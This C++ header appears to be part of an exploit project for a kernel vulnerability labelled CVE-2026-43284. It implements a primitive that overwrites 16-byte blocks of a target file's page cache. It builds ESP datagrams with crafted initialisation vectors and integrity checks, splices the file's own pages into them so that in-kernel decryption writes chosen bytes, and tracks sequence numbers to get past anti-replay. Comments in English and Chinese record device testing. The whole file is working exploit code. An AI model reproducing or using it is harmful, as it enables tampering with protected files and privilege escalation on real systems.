#pragma once
/** @file backend/cve_2026_43284/landing/pagecache_write.hpp
 *  The page cache window body: the sixteen-byte write, assembled from the pieces the table
 *  classified as belonging here.
 *
 *  What the old write did, in order, and what this does instead: read the sixteen bytes it is about
 *  to replace, derive the initialisation vector from them and the key, assemble the ESP header with
 *  the sequence number, send exactly one datagram, and advance the sequence -- and the advance
 *  happens after the send succeeds, which is the order the old code used and the table confirmed.
 *
 *  Two things are deliberately not this file. The splice face and the read are behind an interface,
 *  because they are the system calls and everything about the shape can be pinned without them. The
 *  integrity check itself is behind the same interface, because computing it needs AES and that
 *  primitive is a port of its own; calling it through a landing keeps the omission visible instead of
 *  letting a zero stand in for a real value.
 *
 *  The sequence starts at one because that is where ESP starts, not because a tuning number was
 *  needed: the table measured that the old value was a code default with no other writer, and a
 *  protocol constant is not a setting.
 */
#include <fcntl.h>
#include <unistd.h>
#include "jni/gl_log.hpp"
#include <array>
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/landing/pagecache_doors.hpp"
#include "backend/cve_2026_43284/landing/pagecache_landing.hpp"

namespace ghostlock::backend::cve_2026_43284::landing {
    /** The block one write deals in, and where the header and the check sit inside it. */
    inline constexpr std::size_t kBlockBytes = 16U;
    /** The bytes before the vector: the SPI and the sequence, each big-endian. */
    inline constexpr std::size_t kHeaderBytes = 8U;
    /** The widest datagram this window builds: the prefix, the widest vector, and the check. */
    inline constexpr std::size_t kMaxDatagramBytes = kHeaderBytes + 2U * kBlockBytes + 2U * kBlockBytes;

    /** The system side of one write. */
    class SpliceOps {
    public:
        SpliceOps() noexcept = default;
        SpliceOps(const SpliceOps &) = delete;
        SpliceOps &operator=(const SpliceOps &) = delete;
        virtual ~SpliceOps() noexcept = default;

        /** 最近一次 splice 失败的原因码（0 表示没有失败）。默认实现给 0，所以测试替身不必实现它，
         *  真实现（RealSpliceIo）会把它自己的失败点写进去 —— 设备上定位就靠这一个数。 */
        [[nodiscard]] virtual int last_error() const noexcept { return 0; }

        /** 这个面声明的桥形态（0 = 每块 fork 一次，1 = 一次 fork 的常驻会话）。默认 0：测试替身与
         *  旧装配不必知道它；真实现（RealSpliceIo）把 SpliceIoOps::bridge_mode 原样报出来。
         *  门与面必须同值 —— PageCacheWrite::open_doors 在路由起来时对账。 */
        [[nodiscard]] virtual int bridge_mode() const noexcept { return kBridgeModeSpawn; }


        /** Read bytes at an offset from the file, or a negative value. */
        [[nodiscard]] virtual long read_at(int fd, std::uint8_t *out, std::size_t size,
                                           std::uint64_t offset) noexcept = 0;
        /** Send one datagram built from the block. */
        [[nodiscard]] virtual bool splice_one(int socket_fd, const std::uint8_t *datagram,
                                              std::size_t size, std::uint64_t offset) noexcept = 0;
        /** The initialisation vector: derived from the old block's content, the block the caller
         *  wants in its place, and the key. The desired block is not optional -- the vector is what
         *  makes the in-place decryption write it. */
        virtual void compute_iv(const std::uint8_t old_block[kBlockBytes],
                                const std::uint8_t desired_block[kBlockBytes],
                                const std::uint8_t key[32],
                                std::uint8_t out[kBlockBytes]) noexcept = 0;
        /** The integrity check over the datagram, truncated to the length the frame states. */
        virtual void compute_icv(const std::uint8_t *datagram, std::size_t size,
                                 const std::uint8_t hmac_key[32], std::uint8_t icv_len,
                                 std::uint8_t *out) noexcept = 0;
        /** Whether this surface can put a block of the carrier into the datagram: from a descriptor
         *  it can open, or through a bridge. A surface that can neither cannot land a block. */
        [[nodiscard]] virtual bool can_serve_page() const noexcept { return false; }
        /** Whether this surface can read a block of the carrier back, which the vector and the
         *  verification both need. */
        [[nodiscard]] virtual bool can_read_page() const noexcept { return false; }
    };

    /** How one block write ended, in the terms the landing reports. */
    enum class WriteOutcome : unsigned char {
        Wrote = 0,
        NotOpen = 1,
        /** The old block could not be read, and the vector depends on it. */
        NoOldBlock = 2,
        /** The datagram was not sent. */
        NotSent = 3,
    };

    /** How one block read ended. Separate from the write outcome because a verification read must
     *  not overwrite the verdict of the write it is verifying. */
    enum class ReadOutcome : unsigned char {
        Read = 0,
        /** The carrier door is not open. */
        NotOpen = 1,
        /** Fewer bytes came back than a block, and a short block is not data. */
        Incomplete = 2,
    };

    class PageCacheWrite final : public PageCacheWindow {
    public:
        PageCacheWrite(DoorOps &doors, SpliceOps &splice, int handed_in_fd = -1,
                       int bridge_mode = kBridgeModeDefault) noexcept
            : doors_(doors, handed_in_fd, bridge_mode), splice_(splice) {}

        /** 最近一次写的 splice 失败码（转自表面；见 SpliceOps::last_error）。 */
        [[nodiscard]] int last_error() const noexcept { return splice_.last_error(); }

        /** Open the doors with the whole frame, and keep what the write needs from it. */
        [[nodiscard]] bool open_doors(const SaMaterial &sa) noexcept override {
            /* 两处开关必须同值：门说 session、面说 spawn（或反过来）这种半切换的装配，会让每块仍然
             *  fork 一次而没有人察觉（真机上就是 74 ms/块）。所以它在路由起来时就被拒，而不是等到
             *  1470 块写完之后从耗时里读出来。 */
            if (doors_.bridge_mode() != splice_.bridge_mode()) {
                GL_LOGI("window: refused bridge-mode mismatch doors=%d surface=%d",
                        doors_.bridge_mode(), splice_.bridge_mode());
                return false;
            }
            if (!doors_.open(sa)) {
                return false;
            }
            spi_ = sa.spi;
            icv_len_ = sa.icv_len;
            for (std::size_t i = 0U; i < sizeof(aes_key_); ++i) {
                aes_key_[i] = sa.aes_key[i];
                hmac_key_[i] = sa.hmac_key[i];
            }
            next_seq_ = 1U;
            /* 门开之后的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/pagecache/pagecache.cpp:189-195
             *  —— 那边 write16 用的就是 sa.spi / ctx.next_seq 与十六字节向量；next_seq 从 1 起）。
             *  fd：file_fd 是载体的门（远端为 -1，此时页由 patch #1 写下的 helper 送进管道）。 */
            GL_LOGI("window: doors open spi=0x%08x icv_len=%u next_seq=%u file_fd=%d socket_fd=%d bridge_mode=%d",
                    spi_, static_cast<unsigned>(icv_len_), next_seq_, doors_.file_fd(), doors_.socket_fd(),
                    doors_.bridge_mode());
            return true;
        }

        /** Close what was opened and clear the material this kept. */
        void close_doors() noexcept override {
            static_cast<void>(doors_.close());
            zeroize();
        }

        /** One block: read the old one, derive the vector, build, send, then advance. */
        [[nodiscard]] bool write_block(std::uint64_t position,
                                       const std::uint8_t block[kBlockBytes]) noexcept override {
            /* The carrier may have no descriptor of this process's own -- a vendor file opened by
             *  the bridge -- so what matters is that the surface can put its page in the datagram. */
            if (doors_.socket_fd() < 0 || !splice_.can_serve_page()) {
                outcome_ = WriteOutcome::NotOpen;
                return false;
            }
            std::uint8_t old_block[kBlockBytes] = {};
            if (splice_.read_at(doors_.file_fd(), old_block, kBlockBytes, position) !=
                static_cast<long>(kBlockBytes)) {
                /* No vector without the old block, so there is no datagram to send. */
                outcome_ = WriteOutcome::NoOldBlock;
                return false;
            }
            std::uint8_t iv[kBlockBytes] = {};
            /* The block the caller wants is what the vector is derived against: see compute_iv. */
            splice_.compute_iv(old_block, block, aes_key_, iv);
            /* 组帧的每段长度与头字段（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/pagecache/pagecache.cpp:189-206
             *  —— 那边 compute_cbc_iv 之后依次 store_be32(SPI)、store_be32(seq)、拼 IV，再算 ICV；
             *  :243-251 一个报文 = header_iv + 页 + ICV；ICV 截断长度来自 sa.icv_len）。 */
            GL_LOGI("frame: spi=0x%08x seq=%u icv_len=%u iv=%02x%02x%02x%02x old=%02x%02x%02x%02x want=%02x%02x%02x%02x",
                    spi_, next_seq_, static_cast<unsigned>(icv_len_),
                    static_cast<unsigned>(iv[0]), static_cast<unsigned>(iv[1]),
                    static_cast<unsigned>(iv[2]), static_cast<unsigned>(iv[3]),
                    static_cast<unsigned>(old_block[0]), static_cast<unsigned>(old_block[1]),
                    static_cast<unsigned>(old_block[2]), static_cast<unsigned>(old_block[3]),
                    static_cast<unsigned>(block[0]), static_cast<unsigned>(block[1]),
                    static_cast<unsigned>(block[2]), static_cast<unsigned>(block[3]));
            GL_LOGI("frame: segments hdr=%zu vector=%zu cipher=%zu icv=%zu total=%zu file_fd=%d socket=%d helper=%d",
                    kHeaderBytes, kBlockBytes, kBlockBytes, static_cast<std::size_t>(icv_len_),
                    kHeaderBytes + 2U * kBlockBytes + static_cast<std::size_t>(icv_len_),
                    doors_.file_fd(), doors_.socket_fd(), doors_.file_fd() < 0 ? 1 : 0);
            /* The datagram has the shape the old tree documents, and the length follows from it:
             *  spi(4) | sequence(4) | vector(16) | ciphertext(16) | check(icv_len). The block read
             *  above is the ciphertext already. Everything is assembled before any of it is checked
             *  or sent, because the check covers the whole prefix rather than one field of it. */
            const std::size_t prefix = kHeaderBytes + 2U * kBlockBytes;
            std::array<std::uint8_t, kMaxDatagramBytes> datagram{};
            store_be32(datagram.data(), spi_);
            store_be32(datagram.data() + 4U, next_seq_);
            /* 写侧事实：位置、门的 fd（远端为 -1）、套接字、以及本面能否供页（远端=经桥）。 */
            /*
             * 粒度对齐参照实现（ghostlock-app-ref@5f184760，每 512 字节一行）：只在块边界打印。
             * 发送失败/序号未递增等异常行在下方逐块保留，定位不受影响。
             */
            if ((position % 512ULL) == 0ULL) {
                GL_LOGI("write_block enter pos=%llu fd=%d sock=%d serve=%d",
                        static_cast<unsigned long long>(position), doors_.file_fd(), doors_.socket_fd(),
                        splice_.can_serve_page() ? 1 : 0);
                GL_LOGI("window: send seq=%u offset=%llu hdr=%02x%02x%02x%02x%02x%02x%02x%02x", next_seq_,
                            static_cast<unsigned long long>(position),
                            datagram[0], datagram[1], datagram[2], datagram[3],
                            datagram[4], datagram[5], datagram[6], datagram[7]);
            }
            /* The check covers what the wire will carry, and the wire carries the page's own bytes in
             * the ciphertext slot -- splice_one substitutes them there. Putting the desired block in
             * this slot instead would authenticate bytes nobody sends, and the kernel, which verifies
             * the check before it decrypts, would drop every datagram: found on the device, where the
             * target page never changed. The old tree passed the old block here for the same reason. */
            for (std::size_t i = 0U; i < kBlockBytes; ++i) {
                datagram[kHeaderBytes + i] = iv[i];
                datagram[kHeaderBytes + kBlockBytes + i] = old_block[i];
            }
            splice_.compute_icv(datagram.data(), prefix, hmac_key_, icv_len_,
                                datagram.data() + prefix);
            if (!splice_.splice_one(doors_.socket_fd(), datagram.data(), prefix + icv_len_, position)) {
                GL_LOGI("window: splice NOT sent offset=%llu err=%d seq=%u (20=hdr 21=page 22=len 23=suffix)",
                        static_cast<unsigned long long>(position), splice_.last_error(), next_seq_);
                GL_LOGI("frame not sent: next_seq stays=%u file_fd=%d", next_seq_, doors_.file_fd());
                outcome_ = WriteOutcome::NotSent;
                return false;
            }
            /* Advanced only after the send succeeded, which is the old order. */
            next_seq_ += 1U;
            /* 发送字节数与序号的前后值（成功历史：pagecache.cpp:243-261
             *  —— 那边 total = header_iv + 页 + icv_len 交给 splice；只有 sent == total 才 next_seq += 1）。 */
            GL_LOGI("frame sent: offset=%llu bytes=%zu seq_used=%u next_seq=%u socket=%d file_fd=%d",
                    static_cast<unsigned long long>(position), prefix + static_cast<std::size_t>(icv_len_),
                    next_seq_ - 1U, next_seq_, doors_.socket_fd(), doors_.file_fd());
            outcome_ = WriteOutcome::Wrote;
            return true;
        }

        /** A block read needs a way to the carrier and nothing else: the socket is the write's way
         *  out, and reading the carrier writes nothing. */
        [[nodiscard]] bool can_read() const noexcept override { return splice_.can_read_page(); }

        /** One block read back, through the same surface the write reads the block it replaces
         *  through, so a verification reads the carrier rather than a copy of what was sent. All or
         *  nothing: a short read leaves @p out as it was and names itself, because half a block
         *  compared against a patch is a comparison that must not be believed. */
        [[nodiscard]] bool read_block(std::uint64_t position,
                                      std::uint8_t out[kBlockBytes]) noexcept override {
            if (!splice_.can_read_page()) {
                GL_LOGI("read_block: not open can_read=%d fd=%d pos=%llu",
                        splice_.can_read_page() ? 1 : 0, doors_.file_fd(),
                        static_cast<unsigned long long>(position));
                read_outcome_ = ReadOutcome::NotOpen;
                return false;
            }
            /* Into a local, copied out only for a whole block: a surface that wrote a partial
             *  block straight into the caller's buffer would leave bytes that look like data. */
            std::uint8_t block[kBlockBytes] = {};
            /* 现场对照：同一个 fd 上"直接 pread"与"splice 读"的内容 —— 分开「fd 不对」与「读法不对」。 */
            {
                std::uint8_t direct[kBlockBytes] = {};
                const long got = ::pread(doors_.file_fd(), direct, kBlockBytes, static_cast<off_t>(position));
                GL_LOGI("read_block: fd=%d pos=%llu pread=%ld direct=%02x%02x%02x%02x",
                        doors_.file_fd(), static_cast<unsigned long long>(position), got,
                        direct[0], direct[1], direct[2], direct[3]);
                char link[256] = {};
                char link_path[64] = {};
                std::snprintf(link_path, sizeof(link_path), "/proc/self/fd/%d", doors_.file_fd());
                const ssize_t got_link = ::readlink(link_path, link, sizeof(link) - 1U);
                GL_LOGI("read_block: fd=%d flags=0x%x link=%s", doors_.file_fd(),
                        ::fcntl(doors_.file_fd(), F_GETFL), got_link > 0 ? link : "(none)");
            }
            if (splice_.read_at(doors_.file_fd(), block, kBlockBytes, position) !=
                static_cast<long>(kBlockBytes)) {
                GL_LOGI("read_block: incomplete fd=%d pos=%llu len=%zu",
                        doors_.file_fd(), static_cast<unsigned long long>(position), kBlockBytes);
                read_outcome_ = ReadOutcome::Incomplete;
                return false;
            }
            for (std::size_t i = 0U; i < kBlockBytes; ++i) {
                out[i] = block[i];
            }
            /* 回读的结果（成功历史：pagecache.cpp:116-166 的 read_block —— 只有整块读回才算成）。 */
            GL_LOGI("read_block: ok fd=%d pos=%llu len=%zu head=%02x%02x%02x%02x",
                    doors_.file_fd(), static_cast<unsigned long long>(position), kBlockBytes,
                    static_cast<unsigned>(block[0]), static_cast<unsigned>(block[1]),
                    static_cast<unsigned>(block[2]), static_cast<unsigned>(block[3]));
            read_outcome_ = ReadOutcome::Read;
            return true;
        }

        /** Continue this window from a sequence another window on the same session reached. Called
         *  through the window interface, which is why it is also declared above as the override. The
         *  sequence belongs to the security association, not to the window: the kernel's inbound
         *  anti-replay window drops anything it has already seen, so a second window that restarted
         *  at one would have every datagram refused -- measured on the device, where the second
         *  carrier's write landed nowhere. The retired tree carried the value between its contexts
         *  for the same reason. */
        void adopt_sequence(std::uint32_t next) noexcept override {
            /* 序号的前后值（成功历史：pagecache.cpp:192 store_be32(header_iv + kEspSeqOffset, ctx.next_seq)
             *  —— 同一个 SA 上的后续窗口必须接着前一个的序号，续接发生在写之前）。 */
            GL_LOGI("window: adopt_sequence from=%u to=%u", next_seq_, next == 0U ? 1U : next);
            next_seq_ = next == 0U ? 1U : next;
        }

        [[nodiscard]] WriteOutcome outcome() const noexcept { return outcome_; }
        /** How the last block read ended, which the caller reads after read_block refused. */
        [[nodiscard]] ReadOutcome read_outcome() const noexcept { return read_outcome_; }
        [[nodiscard]] std::uint32_t next_seq() const noexcept { return next_seq_; }
        [[nodiscard]] std::size_t width() const noexcept { return kBlockBytes; }

    private:
        /** Big-endian, as the header is on the wire. */
        static void store_be32(std::uint8_t *out, std::uint32_t value) noexcept {
            out[0] = static_cast<std::uint8_t>((value >> 24U) & 0xffU);
            out[1] = static_cast<std::uint8_t>((value >> 16U) & 0xffU);
            out[2] = static_cast<std::uint8_t>((value >> 8U) & 0xffU);
            out[3] = static_cast<std::uint8_t>(value & 0xffU);
        }

        /** The fields are held rather than the frame, because a parameter set cannot be copied:
         *  its base deletes the copy, which is right for something carrying credentials. */
        void zeroize() noexcept {
            for (std::size_t i = 0U; i < sizeof(aes_key_); ++i) {
                aes_key_[i] = 0U;
                hmac_key_[i] = 0U;
            }
            spi_ = 0U;
            icv_len_ = 0U;
        }

        PageCacheDoors doors_;
        SpliceOps &splice_;
        std::uint32_t spi_ = 0U;
        std::uint8_t icv_len_ = 0U;
        std::uint8_t aes_key_[32] = {};
        std::uint8_t hmac_key_[32] = {};
        std::uint32_t next_seq_ = 1U;
        WriteOutcome outcome_ = WriteOutcome::NotOpen;
        ReadOutcome read_outcome_ = ReadOutcome::NotOpen;
    };
}  // namespace ghostlock::backend::cve_2026_43284::landing
